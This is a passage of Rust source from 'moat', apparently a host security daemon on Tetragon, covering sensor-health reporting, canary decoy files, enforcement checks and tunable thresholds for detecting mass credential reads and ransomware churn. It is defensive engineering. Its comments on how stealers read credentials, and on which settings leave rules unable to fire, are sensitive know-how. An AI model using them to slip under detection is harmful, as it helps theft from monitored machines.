                    summary
                ));
            }
            if self.mode_for("moat-canary-file-read") == "enforce" {
                self.tetra_arm("moat-canary-file-read");
            }
        }
        Ok((summary, failures))
    }

    /// Record that a process asked for a name.
    ///
    /// The payload is the varlink request, in the caller's context, so the pid
    /// and the name arrive together -- which is the whole point, and the thing
    /// the resolved monitor stream structurally cannot say.
    ///
    /// Nothing is raised here. A lookup is not a finding: every browser tab and
    /// every `kubectl` makes them, and the value is entirely in being able to
    /// answer "who asked for this" when something ELSE fires later.
    fn note_dns_query(&mut self, hook: &crate::event::HookHit, exec_id: &str, now: u64) {
        let Some(payload) = hook.bytes_arg() else { return };
        let Some(name) = crate::names::query_name_from_payload(&payload) else {
            return;
        };
        // The exe from the table, not from the event: a `/proc/self/fd/<n>`
        // binary has already been resolved there, and this is the name a person
        // will read off the alert.
        let (pid, exe) = match self.table.get(exec_id) {
            Some(p) => (p.pid, p.exe.clone()),
            None => return,
        };
        self.queries.record(&name, pid, &exe, now);
    }

    /// The decoy paths this machine has planted, for the renderer.
    ///
    /// Read from disk rather than held in memory: `canary off` removes files
    /// and rewrites the manifest, and a stale in-memory copy would re-render a
    /// policy naming paths that are no longer there -- a rule that reports
    /// armed and can never fire, which is the failure this whole feature is
    /// least able to afford.
    pub fn canary_paths(&self) -> Vec<String> {
        crate::canary::Manifest::load(&self.cfg.paths.canaries()).paths()
    }

    /// TracingPolicies the kernel is actually running, counted from the
    /// directories Tetragon pins under its bpffs dir (one per loaded policy).
    ///
    /// `None` means the directory could not be read at all — not mounted, or
    /// this process is not root — which is different from "zero loaded" and
    /// must not be reported as an outage.
    pub fn sensors_loaded(&self) -> Option<usize> {
        let entries = std::fs::read_dir(&self.cfg.paths.tetragon_bpf_dir).ok()?;
        Some(
            entries
                .filter_map(|e| e.ok())
                .filter(|e| e.file_name().to_string_lossy().starts_with("moat-"))
                .count(),
        )
    }

    /// Is the sensor doing its job, in the only terms that matter: how many of
    /// our policies are loaded in the kernel right now.
    ///
    /// The two obvious signals both lie. The gRPC socket is a file that
    /// outlives the process that made it, and the export log keeps getting
    /// fresh writes during a crash loop because every Tetragon start re-walks
    /// `/proc` and re-emits an exec event per live process. On 2026-09-03 this
    /// function returned "running" for 25 minutes while Tetragon was exiting
    /// 255 every 13 seconds and **zero** policies were loaded — the machine was
    /// completely unprotected and every surface said it was fine. Counting
    /// pinned policies is the fix: it asks the kernel, and it goes to zero the
    /// instant the sensor dies.
    /// Rules that are switched ON but cannot possibly fire on this sensor.
    ///
    /// `exec_memfd` and `exec_privileges_raised` read
    /// `process.binary_properties`, which Tetragon only attaches when it runs
    /// with `--enable-process-cred` -- the whole message, including the
    /// unlinked-binary annotation, sits behind that one flag in
    /// `pkg/process/process.go`. Without it both rules are live, configured,
    /// documented, and dead: the exact shape of the containment policy that
    /// loaded, armed and matched nothing for a day on 2026-09-05.
    ///
    /// So moat says so, in `status`, rather than presenting silence as
    /// coverage. Checked against the file rather than the running sensor
    /// because the flag is only readable from the conf.d fragment.
    pub fn inert_rules(&self) -> Vec<String> {
        let needs_cred = [
            ("moat-x-exec-memfd", self.cfg.rules.exec_memfd),
            ("moat-x-exec-privileges-raised", self.cfg.rules.exec_privileges_raised),
        ];
        if !needs_cred.iter().any(|(_, on)| *on) {
            return Vec::new();
        }
        // Sibling of the export-allowlist fragment, so this follows the
        // configured conf.d directory instead of a hardcoded /etc path -- which
        // also stops the test depending on the state of THIS machine's /etc.
        // A test that passes only where the product is not installed is not a
        // test, and the scanner suite had the same fault this morning.
        let Some(confd) = self.cfg.paths.export_allowlist.parent() else {
            return Vec::new();
        };
        let enabled = std::fs::read_to_string(confd.join("enable-process-cred"))
            .map(|t| t.trim().eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        if enabled {
            return Vec::new();
        }
        needs_cred
            .iter()
            .filter(|(_, on)| *on)
            .map(|(id, _)| (*id).to_string())
            .collect()
    }

    /// Is the sensor still attaching, as opposed to broken?
    ///
    /// Both look identical from the pin count alone -- fewer policies than
    /// there should be -- and the advice for each is the opposite. On
    /// 2026-09-10 tetragon took 19 seconds to pin 51 policies, and during that
    /// window `moatctl status` said "degraded 50/51 *** NOT PROTECTED --
    /// check: systemctl status tetragon ***": a fault report, pointing at a
    /// healthy unit, for a sensor that was simply not finished. Two decoy
    /// reads in that window went unobserved and read as the detection being
    /// broken, which cost an evening.
    ///
    /// The distinction is whether policies are still ARRIVING. The bpffs
    /// directory's mtime moves every time tetragon pins one, so a count below
    /// expected with a directory touched seconds ago is a sensor mid-load; the
    /// same count with a directory untouched for a minute is a sensor that
    /// stopped short and needs looking at.
    /// NOT for a count of zero. `sensor_health_is_counted_from_the_kernel_not_
    /// guessed` exists because an earlier version trusted a file's existence
    /// and a log's mtime, and "a crash loop keeps both fresh" -- this is the
    /// same mtime, so it gets the same suspicion. Nothing pinned stays `down`
    /// however recently the directory was touched, which is the case a crash
    /// loop actually produces.
    ///
    /// What is left is the honest residual: a sensor that pins some policies,
    /// dies, and repeats would read `loading` rather than `degraded`. Both are
    /// `sensor_unhealthy`, so nothing is excused by this -- only the advice
    /// changes, and after SENSOR_SETTLE_SECS without a new pin it says
    /// `degraded` anyway.
    fn sensor_is_settling(&self) -> bool {
        let Ok(m) = std::fs::metadata(&self.cfg.paths.tetragon_bpf_dir) else {
            return false;
        };
        use std::os::unix::fs::MetadataExt;
        let age = util::unix_secs().saturating_sub(m.mtime().max(0) as u64);
        age < self.sensor_settle_secs
    }

    pub fn tetragon_state(&self) -> String {
        let expected = self.policies.len();
        match self.sensors_loaded() {
            // Zero is always down, never "just starting" -- see
            // `sensor_is_settling`. That is the shape a crash loop makes.
            Some(0) if expected > 0 => "down".into(),
            Some(n) if n < expected && self.sensor_is_settling() => {
                format!("loading {}/{}", n, expected)
            }
            Some(n) if n < expected => format!("degraded {}/{}", n, expected),
            Some(_) => "running".into(),
            // Cannot see bpffs. Fall back to the old, weaker heuristics, but
            // never claim more than "unverified" from them.
            None => {
                if self.cfg.paths.tetragon_socket.exists() {
                    return "unverified".into();
                }
                if let Ok(m) = std::fs::metadata(&self.cfg.paths.tetragon_log) {
                    use std::os::unix::fs::MetadataExt;
                    let age = util::unix_secs().saturating_sub(m.mtime().max(0) as u64);
                    if age < 300 {
                        return "unverified".into();
                    }
                    return "stale".into();
                }
                "stopped".into()
            }
        }
    }

    /// True when the sensor is not fully loaded. The shield must not be green
    /// here no matter how quiet the alert counts are: no alerts from a dead
    /// sensor is the most dangerous shape of "quiet" there is.
    pub fn sensor_unhealthy(&self) -> bool {
        !matches!(self.tetragon_state().as_str(), "running" | "unverified")
    }

    /// Unhealthy because it has not FINISHED, rather than because it is broken.
    ///
    /// Still unhealthy -- coverage really is incomplete and saying nothing
    /// would be the worse lie -- but the advice is the opposite of the
    /// degraded case: wait a few seconds, do not go looking for a fault.
    pub fn sensor_loading(&self) -> bool {
        self.tetragon_state().starts_with("loading")
    }

    pub fn sandbox_on(&self) -> bool {
        self.cfg.paths.sandbox_flag.exists()
    }

    pub fn status(&self) -> Value {
        let unacked = self.store.unacked();
        let ledger = self.store.ledger();
        let now = util::unix_secs();
        let mut digest_summary = self.digest(now).to_json();
        if let Some(o) = digest_summary.as_object_mut() {
            o.insert("last_sent_unix".into(), Value::from(self.digest_last_sent));
        }
        let mut out = json!({
            "ok": true,
            "version": crate::VERSION,
            "mode": self.mode,
            "enforcing_rules": self.enforcing_rules.iter().cloned().collect::<Vec<_>>(),
            "tetragon": self.tetragon_state(),
            // `policies` is what is on disk; `sensors_loaded` is what the
            // kernel is running. They are equal on a healthy machine and the
            // gap between them is the whole point of reporting both.
            "policies": self.policies.len(),
            // A kernel with no BPF LSM runs every LSM policy as a kprobe
            // instead (see render::lsm_to_kprobes). Detection is intact;
            // in-kernel REFUSAL is not available at all, on any rule. Reported
            // because the alternative is a panel that says "blocking 8 rules"
            // on a machine that cannot block anything -- which is the exact
            // failure the enforcing_verified check exists to prevent, arriving
            // from the kernel side instead.
            "bpf_lsm": crate::render::bpf_lsm_available(),
            "sensors_loaded": self.sensors_loaded(),
            "sensor_unhealthy": self.sensor_unhealthy(),
            "policies_failed": self.policies_failed,
            "feeds": {
                "updated": self.feeds.meta.updated,
                // The malicious-package index: what the six scanners consult.
                "seq": self.feeds.meta.seq,
                "packages": self.feeds.meta.packages,
                // Operator-supplied since abuse.ch was dropped. Reported
                // separately from `packages` so that "you have no hash feed"
                // does not read as "you have no feed" -- the hash feed now has
                // no keyless source, and that is a deliberate trade, not a
                // fault. See docs/PACKAGE-FEED.md.
                "hashes": self.feeds.meta.hashes,
                "domains": self.feeds.meta.domains,
                "urls": self.feeds.meta.urls,
                "hashes_source": "operator-supplied",
                // The published domain list, counted apart from the operator's
                // for the same reason: they have different owners and the
                // reader's next move differs. `domains` is a file on this
                // machine somebody typed; `domain_feed` is the signed import.
                "domain_feed": self.feeds.meta.domain_feed,
                "domain_feed_seq": self.feeds.meta.domain_feed_seq,
                "domain_feed_updated": self.feeds.meta.domain_feed_updated,
                "domain_feed_source": "ThreatFox (abuse.ch)",
                // Whether the fetcher is switched on at all. Without this,
                // "never updated" is all anyone can say -- and it reads as a
                // fault when the truth may be that it was deliberately pinned.
                // The reason lived only in the journal of a service that exits
                // successfully, which is nobody's first place to look.
                "configured": crate::feeds::FeedsConfig::load(&self.cfg.paths.feeds_config)
                    .map(|c| c.enabled)
                    .unwrap_or(false),
            },
            "unacked": unacked,
            "sandbox": self.sandbox_on(),
            // Separate from `sensor_unhealthy`, which stays true for both: a
            // sensor mid-load and a sensor that stopped short look identical in
            // the pin count and need opposite advice.
            "sensor_loading": self.sensor_loading(),
            // Two numbers, because "canaries are on" and "canaries can still
            // fire" are different questions: a decoy deleted by a /tmp sweep
            // leaves the rule loaded and armed with nothing to match.
            "canaries": self.canary_paths().len(),
            "canaries_missing": crate::canary::missing(
                &crate::canary::Manifest::load(&self.cfg.paths.canaries())
            ).len(),
            "canary_enforcing": self.mode_for("moat-canary-file-read") == "enforce",
            // Whether the *caller* is in the group is a client-side question:
            // if it were not, it could not have reached this socket.
            "socket_group": self.cfg.group,
            "uptime_secs": now.saturating_sub(self.started),
            "events_seen": self.events_seen,
            "alerts": self.alerts_emitted,
            "alerts_suppressed": self.alerts_suppressed,
            "processes": self.table.len(),
            // docs/DNS.md. `state` is the reader's last word; `addresses` is
            // how many the cache currently holds. "connected" with 0 addresses
            // a minute after boot is normal; "refused" or "unavailable" is not.
            "names": {
                "source": crate::names::SOURCE,
                "enabled": self.cfg.names.enabled,
                "state": self.names_state,
                "addresses": self.names.len(),
                "recorded": self.names.recorded,
            },
            "allowlist_rules": self.allowlist.len(),

            // --- BASELINE §8 "Resolved shapes" ---------------------------
            "installed_at": util::rfc3339_of(self.baseline.state.installed_at),
            "baseline": self.baseline.status(now),
            "proposals": self.baseline.proposals(),
            "demoted_rules": self.baseline.demoted_rules(),
            // LEARNING §2c. The panel needs this to tell "no verdict yet"
            // apart from "verdicts are switched off": without it an untriaged
            // incident shows nothing about analysis at all and the feature is
            // invisible until it happens to have finished.
            "auto_triage": self.cfg.analysis.auto_triage.as_str(),
            // The badge, and nothing else — the same set `cmd_triage` offers,
            // or the panel counts work the runner will never be given. A
            // `signal` row is on the timeline by construction and so is out of
            // this number; a suppressed row is out of it explicitly.
            "triage_pending": self.store.count_alerts(|a| {
                a.surface == "alerts" && !a.acked && !a.is_suppressed() && a.triage.is_none()
            }),
            "rarity_counters": self.rarity.len(),

            // --- telemetry -------------------------------------------------
            // What is being RECORDED, on the same response as what is being
            // detected. A reader that sees `sensor_unhealthy: false` and
            // `telemetry.classes: ["alerts"]` knows exactly how much of this
            // machine's history exists, which is the honest answer to "can I
            // go back and look".
            "telemetry": {
                "classes": self.cfg.telemetry.classes(),
                "written": self.telemetry_written,
                "filtered": self.telemetry_filtered,
                "file": self.telemetry.as_ref().map(|t| t.path().display().to_string()),
            },

            // --- LEARNING §9 "Resolved shapes" ----------------------------
            // `digest` is the boolean the plugin's settings row binds to;
            // `digest_summary` is the {due, text} block LEARNING §5 asks the
            // daemon to publish, which `moatctl digest` prints and the user
            // timer delivers.
            "digest": self.digest_enabled,
            "digest_enabled": self.digest_enabled,
            "digest_summary": digest_summary,
            "incidents": incident::count(&self.incidents_dir()),
            "incidents_dir": self.incidents_dir().display().to_string(),
            "incidents_captured": self.incidents_captured,
            // Design 2b/3a. `chains_open` is what the panel needs to know it
            // must render 3a instead of 1b; `chains_formed` is the counter for
            // the digest and for judging whether the thresholds are right.
            "chains_open": self.chains.len(),
            "chains_formed": self.chains.formed,
            "receipts": self.store.receipts().len(),
            "installs_watched": self.receipts.len(),

            "provenance": {
                "packages": self.provenance.db().packages,
                "files": self.provenance.db().files,
                "trusted_repos": self.cfg.baseline.trusted_repos,
            },
        });
        // Inserted rather than written inline: `json!` hits its recursion limit
        // on an object this size.
        //
        // Which rules CAN be armed, and what arming one actually does.
        // `enforcing_rules` above says what IS armed, which is not enough to
        // offer the choice anywhere: only a rule whose policy carries an
        // enforcing action can be armed at all -- 7 of 46 here -- and the two
        // kinds are different promises. `kill` ends the process; `deny` refuses
        // the operation with -EPERM and the program keeps running. Anything
        // presenting this as a switch has to be able to say which one the user
        // is turning on.
        if let Some(o) = out.as_object_mut() {
            // The three plainly named populations of alerts.jsonl, so nothing
            // downstream has to print a count under a word that means something
            // else. `unacked` above is unchanged and stays the badge -- the
            // panel builds against it -- and `ledger.needs_you` is that same
            // set as one number. See `AlertStore::ledger`.
            o.insert(
                "ledger".into(),
                json!({
                    "needs_you": ledger.needs_you,
                    "recorded": ledger.recorded,
                    "suppressed": ledger.suppressed,
                    "signal": ledger.signal,
                }),
            );
            // What the RECORD says (`enforcing_rules`, above) split by what the
            // KERNEL says. The panel keeps binding to `enforcing_rules`; these
            // two are the honest breakdown of it, and they are the difference
            // between "seven rules are armed" and "seven rules are listed as
            // armed and none of them will kill anything" -- which is what this
            // machine was in for most of 2026-09-05.
            //
            // An empty `enforcing_unverified` alongside an empty
            // `enforcing_verified` and a non-empty `enforcing_rules` means
            // moatd could not ask the kernel, not that the kernel agreed.
            // `enforcement_unhealthy` is the single boolean, exactly like
            // `sensor_unhealthy`.
            o.insert(
                "enforcing_verified".into(),
                Value::from(self.enforcing_verified.iter().cloned().collect::<Vec<_>>()),
            );
            o.insert(
                "enforcing_unverified".into(),
                Value::from(self.enforcing_unverified.iter().cloned().collect::<Vec<_>>()),
            );
            o.insert(
                "enforcement_unhealthy".into(),
                Value::from(!self.enforcing_unverified.is_empty()),
            );
            o.insert(
                "arming_pending".into(),
                Value::from(matches!(self.arming, Arming::Waiting { .. })),
            );
            o.insert("enforceable".into(), Value::from(self.enforceable()));
            // Also what `write_state` persists, which is how a containment
            // survives a restart. A policy moatd forgot is one nobody will ever
            // delete: it would keep refusing that connection until tetragon
            // next restarts, with nothing on screen saying why.
            o.insert("contain".into(), self.contain.to_state());
            o.insert(
                "kernel_exclusions".into(),
                serde_json::to_value(&self.kernel_exclusions).unwrap_or(Value::Null),
            );
            // Persisted for the same reason `contain` is, and published for a
            // second one: a retuned threshold is a change to what moat catches,
            // and a change to what moat catches that nothing reports is
            // indistinguishable from a detection that quietly stopped working.
            o.insert(
                "threshold_overrides".into(),
                serde_json::to_value(&self.threshold_overrides).unwrap_or(Value::Null),
            );
            o.insert(
                "thresholds".into(),
                json!({
                    "mass_read_files": self.cfg.thresholds.mass_read_files,
                    "mass_read_window_secs": self.cfg.thresholds.mass_read_window_secs,
                    "ransom_churn_files": self.cfg.thresholds.ransom_churn_files,
                    "ransom_churn_window_secs": self.cfg.thresholds.ransom_churn_window_secs,
                    "dedupe_secs": self.cfg.thresholds.dedupe_secs,
                }),
            );
            o.insert("contain_enabled".into(), Value::from(self.cfg.contain.enabled));
            o.insert("contain_kill".into(), Value::from(self.cfg.contain.kill.clone()));
            // Rules that are on but cannot fire. Empty on a healthy machine.
            o.insert(
                "inert_rules".into(),
                serde_json::to_value(self.inert_rules()).unwrap_or(Value::Null),
            );
            // The hourly content-analysis budget. Persisted for the same reason
            // the containment is: an allowance a restart refills is not one.
            o.insert("content".into(), self.content.to_state());
            // Written into state.json on every save, so the NEXT start can see
            // how long moat was not running. Stopping the daemon needs root,
            // and a root-level shutdown left no trace at all before this.
            o.insert("heartbeat".into(), Value::from(util::unix_secs()));
            // The same instant on the monotonic clock. Paired with `heartbeat`
            // it says how much of a later gap the machine spent awake, which is
            // the only part of it anything could have happened in.
            o.insert("awake".into(), Value::from(util::awake_secs()));
            // Which modified files have already been reported. See the field's
            // comment: without this a distribution's own post-install edit is
            // a high alert on every boot.
            o.insert("last_sweep".into(), Value::from(self.last_sweep));
            o.insert("sweep_cursor".into(), Value::from(self.sweep_cursor.clone()));
            o.insert(
                "modified_reported".into(),
                Value::from(
                    self.modified_reported
                        .iter()
                        .cloned()
                        .collect::<Vec<String>>(),
                ),
            );
            // Whether container activity reaches the badge. Set out here rather
            // than in the literal above, which is already at serde_json's macro
            // recursion limit.
            o.insert(
                "inspect_containers".into(),
                Value::Bool(self.inspect_containers),
            );
        }
        out
    }

    /// Put every recorded override back onto `cfg.thresholds`.
    ///
    /// Called after construction and after every SIGHUP. Unknown keys are
    /// dropped rather than kept: a state file naming a threshold this build no
    /// longer has must not survive as a number nothing reads.
    pub fn apply_threshold_overrides(&mut self) {
        self.threshold_overrides
            .retain(|k, _| tunable_threshold(k).is_some());
        let pairs: Vec<(String, u64)> = self
            .threshold_overrides
            .iter()
            .map(|(k, v)| (k.clone(), *v))
            .collect();
        for (k, v) in pairs {
            self.write_threshold(&k, v);
        }
        self.table.max_depth = self.cfg.thresholds.ancestry_max;
        self.table.prune_secs = self.cfg.thresholds.process_prune_secs;
    }

    fn write_threshold(&mut self, key: &str, value: u64) {
        let t = &mut self.cfg.thresholds;
        match key {
            "dedupe_secs" => t.dedupe_secs = value,
            "mass_read_files" => t.mass_read_files = value as usize,
            "mass_read_window_secs" => t.mass_read_window_secs = value,
            "ransom_churn_files" => t.ransom_churn_files = value as usize,
            "ransom_churn_window_secs" => t.ransom_churn_window_secs = value,
            _ => {}
        }
    }

    /// The value a tunable threshold currently has, override or file.
    pub fn threshold(&self, key: &str) -> Option<u64> {
        let t = &self.cfg.thresholds;
        Some(match key {
            "dedupe_secs" => t.dedupe_secs,
            "mass_read_files" => t.mass_read_files as u64,
            "mass_read_window_secs" => t.mass_read_window_secs,
            "ransom_churn_files" => t.ransom_churn_files as u64,
            "ransom_churn_window_secs" => t.ransom_churn_window_secs,
            _ => return None,
        })
    }

    /// `moatctl set threshold.<name> <value>`: retune a detection without
    /// hand-editing `/etc/moat/moat.toml` and restarting the daemon.
    ///
    /// Returns `(previous, new, direction)` where direction is `weaker`,
    /// `stronger` or `same` — the caller records it, because which way a
    /// threshold moved is the only part of this a person can act on later.
    ///
    /// Takes effect on the next event: `rules::mass_read` and
    /// `rules::ransom_churn` both read `ctx.cfg.thresholds` per event rather
    /// than caching it at construction, so there is nothing to restart.
    pub fn set_threshold(&mut self, key: &str, value: u64) -> Result<(u64, u64, &'static str), String> {
        let Some(t) = tunable_threshold(key) else {
            let names: Vec<&str> = TUNABLE_THRESHOLDS.iter().map(|t| t.key).collect();
            return Err(format!(
                "{:?} is not a tunable threshold. These are: {}. The rest of [thresholds] in \
                 moat.toml is plumbing (log rotation, poll intervals, the arm timeout) rather \
                 than tuning, and is deliberately not reachable from the socket.",
                key,
                names.join(", ")
            ));
        };
        if value < t.min || value > t.max {
            return Err(format!(
                "{} must be between {} and {}, got {}. {}",
                t.key, t.min, t.max, value, t.why
            ));
        }
        let had = self.threshold(key).unwrap_or(0);
        self.threshold_overrides.insert(key.to_string(), value);
        self.write_threshold(key, value);
        self.table.max_depth = self.cfg.thresholds.ancestry_max;
        self.table.prune_secs = self.cfg.thresholds.process_prune_secs;
        self.write_state();
        let direction = match value.cmp(&had) {
            std::cmp::Ordering::Equal => "same",
            // Bigger means the rule needs more evidence before it fires, for
            // every threshold in the table -- including the two window lengths,
            // where a longer window means MORE gets caught. `weakens_when` says
            // which way round each one is, so this cannot be assumed.
            o => {
                let bigger = o == std::cmp::Ordering::Greater;
                if bigger == t.bigger_is_weaker {
                    "weaker"
                } else {
                    "stronger"
                }
            }
        };
        Ok((had, value, direction))
    }

    /// Drop an override and go back to whatever `/etc/moat/moat.toml` says.
    ///
    /// The way back is not optional, and it is the reason the overrides are
    /// kept as a separate map: with them merged into `cfg` there would be no
    /// record of what the file had said, so "reset" would mean "restart the
    /// daemon and hope".
    pub fn reset_threshold(&mut self, key: &str) -> Result<u64, String> {
        if tunable_threshold(key).is_none() {
            return Err(format!("{:?} is not a tunable threshold", key));
        }
        self.threshold_overrides.remove(key);
        match Config::load(&self.cfg_path) {
            Ok(c) => self.cfg.thresholds = c.thresholds,
            Err(e) => return Err(format!("cannot re-read {}: {}", self.cfg_path.display(), e)),
        }
        self.apply_threshold_overrides();
        self.write_state();
        Ok(self.threshold(key).unwrap_or(0))
    }

    pub fn write_state(&self) {
        let path = self.cfg.paths.state_file();
        let body = format!(
            "{}\n",
            serde_json::to_string_pretty(&self.status()).unwrap_or_default()
        );
        if let Err(e) = util::atomic_write(&path, body.as_bytes(), 0o640) {
            log::warn!("state.json: {}", e);
            return;
        }
        let _ = util::secure_path(&path, &self.cfg.group, 0o640);
    }
}

/// `Finding` built straight from a policy name needs its family from the name.
impl Finding {
    fn family_fixup(&mut self) {
        if self.meta.family.is_empty() || self.meta.family == "other" {
            self.meta.family = family_of(&self.rule);
        }
    }
}

fn access_word(mask: Option<i64>) -> Option<String> {
    let m = mask?;
    let mut parts = Vec::new();
    if m & 4 != 0 {
        parts.push("read");
    }
    if m & 2 != 0 {
        parts.push("write");
    }
    if m & 1 != 0 {
        parts.push("exec");
    }
    if m & 8 != 0 {
        parts.push("append");
    }
    if parts.is_empty() {
        Some(format!("mask {}", m))
    } else {
        Some(parts.join("+"))
    }
}

/// Open `telemetry.jsonl` only when there is something to write to it.
///
/// `alerts` is not a reason: that class *is* `alerts.jsonl`, which already
/// exists and is already the right file. With every other class off this
/// returns `None` and the whole telemetry path costs one `Option` check per
/// event, which is what "off by default" has to mean at 42 events a second.
fn open_telemetry(cfg: &Config) -> Option<crate::telemetry::TelemetryStore> {
    if !(cfg.telemetry.process || cfg.telemetry.network || cfg.telemetry.file) {
        return None;
    }
    for p in cfg.telemetry.problems() {
        log::warn!("telemetry: {}", p);
    }
    match crate::telemetry::TelemetryStore::open(
        &cfg.paths.telemetry(),
        &cfg.paths.telemetry_rotated(),
        cfg.telemetry.max_bytes,
        &cfg.group,
    ) {
        Ok(s) => {
            log::info!(
                "telemetry classes on: {:?} -> {}",
                cfg.telemetry.classes(),
                s.path().display()
            );
            Some(s)
        }
        Err(e) => {
            log::error!("telemetry: {} ({})", e, cfg.paths.telemetry().display());
            None
        }
    }
}

/// The sha256 an incident snapshot already computed for this file, if it copied
/// it. Saves the content analyser a second walk over the same bytes.
///
/// The incident record on the alert carries `file/<basename>` and a size, not
/// the original path (the path -> copy mapping lives in the snapshot's
/// `meta.json`, which is not folded into the alert). Basename alone would be
/// enough to attach the wrong hash to the wrong file — two `index.js` in one
/// tree is not exotic — so the size has to agree as well. If it does not, this
/// returns `None` and the analyser hashes what it reads, which is always
/// correct and merely costs a hash over a buffer already in memory.
fn incident_sha(a: &Alert, path: &str) -> Option<String> {
    let inc = a.incident.as_ref()?;
    let want = format!("file/{}", util::basename(path));
    let size = std::fs::metadata(path).ok()?.len();
    let mut hit = inc
        .files
        .iter()
        .filter(|f| f.name == want && f.size == size && f.sha256.len() == 64);
    let first = hit.next()?;
    if hit.next().is_some() {
        return None;
    }
    Some(first.sha256.clone())
}

fn read_state(path: &Path) -> Option<Value> {
    let text = std::fs::read_to_string(path).ok()?;
    serde_json::from_str(&text).ok()
}

// ---------------------------------------------------------------- arming

/// Where the post-start re-arming has got to. See `Daemon::arm_tick`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Arming {
    /// Nothing left to do: everything took, or nothing is armed, or the
    /// deadline passed and the outcome is published in `enforcing_unverified`.
    Idle,
    /// Waiting for the sensor to finish loading, or retrying a `set-mode` that
    /// failed. All three fields are unix seconds / attempt counts.
    Waiting { deadline: u64, next_try: u64, tries: u32 },
}

/// Seconds until the next arming attempt. Bounded and monotone: quick while the
/// sensor is plausibly still loading (16 s on this machine), slower once it is
/// clear something is actually wrong, so a dead sensor does not mean a `tetra`
/// fork every five seconds for two minutes.
fn arm_backoff(tries: u32) -> u64 {
    match tries {
        0..=3 => 2,
        4..=7 => 5,
        8..=15 => 15,
        _ => 30,
    }
}

/// The wanted policies the kernel does NOT report as enforcing.
///
/// A name the kernel has never heard of counts as disagreeing, not as
/// "unknown": a policy that is not loaded is certainly not enforcing.
fn disagreeing(
    want: &[String],
    modes: &std::collections::BTreeMap<String, String>,
) -> Vec<String> {
    want.iter()
        .filter(|n| modes.get(*n).map(|m| m != "enforce").unwrap_or(true))
        .cloned()
        .collect()
}

/// `TP_MODE_ENFORCE` / `1` / `"enforce"` -> `"enforce"`, and the monitor forms
/// likewise. Anything else stays as it came, lowercased, so an unrecognised
/// mode is reported rather than silently counted as one of the two we know.
fn normalise_mode(v: &Value) -> String {
    if let Some(n) = v.as_u64() {
        // TracingPolicyMode from the descriptor in /usr/bin/tetra (v1.7.1):
        // UNKNOWN 0, ENFORCE 1, MONITOR 2, MONITOR_ONLY 3.
        return match n {
            1 => "enforce".into(),
            2 | 3 => "monitor".into(),
            _ => "unknown".into(),
        };
    }
    let s = v.as_str().unwrap_or("").to_ascii_uppercase();
    if s.contains("ENFORCE") {
        "enforce".into()
    } else if s.contains("MONITOR") {
        "monitor".into()
    } else {
        s.to_ascii_lowercase()
    }
}

/// `tetra tracingpolicy list -o json` -> `{policy name: mode}`.
///
/// Deliberately shape-tolerant. The response is
/// `{"policies":[{"name":…,"mode":…}]}` in v1.7.1, but the enum can serialise
/// as a name or a number depending on which marshaller is in the path, and
/// tetra has moved this output around between releases. So this walks the JSON
/// for any object carrying both a name and a mode rather than pinning one
/// path — a parser that breaks on an upgrade would take enforcement
/// verification down with it, silently, which is the failure it exists to
/// catch. Falls back to the `ID NAME STATE … MODE` text table.
fn parse_policy_modes(text: &str) -> Option<std::collections::BTreeMap<String, String>> {
    let mut out = std::collections::BTreeMap::new();
    if let Ok(v) = serde_json::from_str::<Value>(text) {
        collect_policy_modes(&v, &mut out);
        if !out.is_empty() {
            return Some(out);
        }
        // Valid JSON that named no policy: the sensor is up and running none.
        // That is an answer, not a parse failure.
        return Some(out);
    }
    // Text table: `ID NAME STATE FILTERID NAMESPACE SENSORS KERNELMEMORY MODE
    // NPOST NENFORCE NMONITOR`, space-padded by Go's tabwriter.
    //
    // Read by SHAPE, not by column index. tabwriter pads with spaces, so an
    // empty column (NAMESPACE, always empty here) is invisible once the line is
    // split and every index after it is wrong. The id is a number, the name
    // follows it, and the mode is the only `TP_MODE_*` token on the line.
    let mut saw_header = false;
    for line in text.lines() {
        let f: Vec<&str> = line.split_whitespace().collect();
        if f.contains(&"NAME") && f.contains(&"MODE") {
            saw_header = true;
            continue;
        }
        if !saw_header || f.len() < 3 || f[0].parse::<u64>().is_err() {
            continue;
        }
        if let Some(mode) = f.iter().find(|t| t.starts_with("TP_MODE_")) {
            out.insert(f[1].to_string(), normalise_mode(&Value::from(*mode)));
        }
    }
    saw_header.then_some(out)
}

fn collect_policy_modes(v: &Value, out: &mut std::collections::BTreeMap<String, String>) {
    match v {
        Value::Array(a) => a.iter().for_each(|e| collect_policy_modes(e, out)),
        Value::Object(o) => {
            let name = o.get("name").or_else(|| o.get("Name")).and_then(|n| n.as_str());
            let mode = o.get("mode").or_else(|| o.get("Mode"));
            if let (Some(name), Some(mode)) = (name, mode) {
                out.insert(name.to_string(), normalise_mode(mode));
            }
            o.values().for_each(|e| collect_policy_modes(e, out));
        }
        _ => {}
    }
}

/// One retunable number, with the bounds and the sentence that explains them.
pub struct TunableThreshold {
    pub key: &'static str,
    pub min: u64,
    pub max: u64,
    /// Does a LARGER value mean less gets caught? True for a count (more
    /// evidence needed before the rule fires), false for a window (a longer
    /// window catches a slower actor).
    pub bigger_is_weaker: bool,
    pub why: &'static str,
}

/// The thresholds `moatctl set threshold.<name>` may change, and nothing else.
///
/// Deliberately a short list. `[thresholds]` in moat.toml also holds log
/// rotation sizes, poll intervals and the sensor arm timeout; those are
/// plumbing, and exposing them over a socket the user's whole login group can
/// reach is risk with no tuning value. What is here is exactly the set a person
/// retunes because a detection is too loud or too quiet on THEIR machine.
///
/// The bounds are not decoration. Every one of these has a value at which the
/// rule stops existing while `moatctl status` goes on listing it as on — a
/// threshold of 10,000 files is off, not tuned — and a silently-disabled
/// detection is the failure mode this product is built against. The floor
/// matters just as much: `mass_read_files = 1` makes every credential read an
/// alert, which is noise nobody reads, which is also off.
pub const TUNABLE_THRESHOLDS: &[TunableThreshold] = &[
    TunableThreshold {
        key: "mass_read_files",
        min: 2,
        max: 25,
        bigger_is_weaker: true,
        why: "Below 2 there is no \"mass\" left: one credential read is a single-file event and \
              the per-file rules already cover it. Above 25 the rule cannot fire -- a real \
              stealer reads a dozen, and 40 was the shipped value until 2026-09-04 precisely \
              because it had never fired once.",
    },
    TunableThreshold {
        key: "mass_read_window_secs",
        min: 5,
        max: 3600,
        bigger_is_weaker: false,
        why: "A longer window catches a slower reader and costs a little more state; an hour \
              is the point past which \"in one burst\" stops meaning anything.",
    },
    TunableThreshold {
        key: "ransom_churn_files",
        min: 3,
        max: 500,
        bigger_is_weaker: true,
        why: "Below 3 this collides with ordinary `mv` across filesystems and scripts tidying a \
              handful of files. Ransomware does hundreds a minute, so anything up to 500 still \
